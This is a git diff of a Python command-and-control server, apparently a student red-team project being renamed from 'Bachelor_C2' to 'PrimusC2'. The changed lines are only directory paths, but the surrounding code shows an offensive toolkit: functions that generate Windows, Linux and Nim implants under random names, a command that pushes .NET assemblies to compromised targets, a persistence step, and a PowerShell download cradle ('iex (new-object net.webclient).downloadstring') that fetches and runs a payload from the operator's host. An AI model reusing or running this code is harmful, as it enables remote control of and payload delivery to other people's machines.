@@ -112,7 +112,7 @@ def target_comm(target_id, targets, num):
                     print('[+] The persistance technique has completed')
             if message == 'execute-asm\n':
                 asm_name = input('[*] Enter the name of the .NET executable[<name>.byte]: ')
-                file_loc = os.path.expanduser(f'~/Bachelor_C2/C2/Payloads/{asm_name}')
+                file_loc = os.path.expanduser(f'~/PrimusC2/C2/Payloads/{asm_name}')
                 if os.path.exists(file_loc):
                     with open(file_loc, 'r') as file:
                         data = file.read()
@@ -174,8 +174,8 @@ def comm_handler():
 def winplant():
     random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
     f_name= f'{random_name}.py'
-    file_loc = os.path.expanduser('~/Bachelor_C2/implant/winplant.py')
-    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
+    file_loc = os.path.expanduser('~/PrimusC2/implant/winplant.py')
+    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
     if os.path.exists(file_loc):
         shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
@@ -202,8 +202,8 @@ def winplant():
 def linplant():
     random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
     f_name= f'{random_name}.py'
-    file_loc = os.path.expanduser('~/Bachelor_C2/implant/linplant.py')
-    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
+    file_loc = os.path.expanduser('~/PrimusC2/implant/linplant.py')
+    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
     if os.path.exists(file_loc):
         shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
@@ -229,8 +229,8 @@ def nimplant():
     compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
     f_name= f'{compile_name}.nim'
     exe_file = f'{random_name}.exe'
-    file_loc = os.path.expanduser('~/Bachelor_C2/implant/implant.nim')
-    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
+    file_loc = os.path.expanduser('~/PrimusC2/implant/implant.nim')
+    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
     if os.path.exists(file_loc):
         shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
@@ -255,7 +255,7 @@ def nimplant():
         print(f'[+] {exe_file} saved to {implant_loc}')   
     else:
         print('[-] An error occurred while compiling the implant')
-    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
+    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
     os.remove(f'{implant_loc}/{f_name}')
 def resolve_ip(interface):
     
@@ -270,14 +270,14 @@ def resolve_ip(interface):
 def pwsh_cradle():
     try:
         payload_name = input('[*] Input payload name for transfer: ')
-        check_file_loc = os.path.expanduser(f'~/Bachelor_C2/C2/Payloads/{payload_name}')
+        check_file_loc = os.path.expanduser(f'~/PrimusC2/C2/Payloads/{payload_name}')
         
         if os.path.exists(check_file_loc):
             runner_file = (''.join(random.choices(string.ascii_lowercase, k=8)))
             runner_file = f'{runner_file}.exe'
             random_exe = (''.join(random.choices(string.ascii_lowercase, k=6)))
             random_exe = f'{random_exe}.exe'
-            payload_loc = os.path.expanduser('~/Bachelor_C2/C2/Payloads')
+            payload_loc = os.path.expanduser('~/PrimusC2/C2/Payloads')
             print(f'[*] Payload server available at {host_ip}:8999')
             runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/Payloads/{runner_file}')".encode('utf-16le')
             with open(runner_file, 'w') as f:
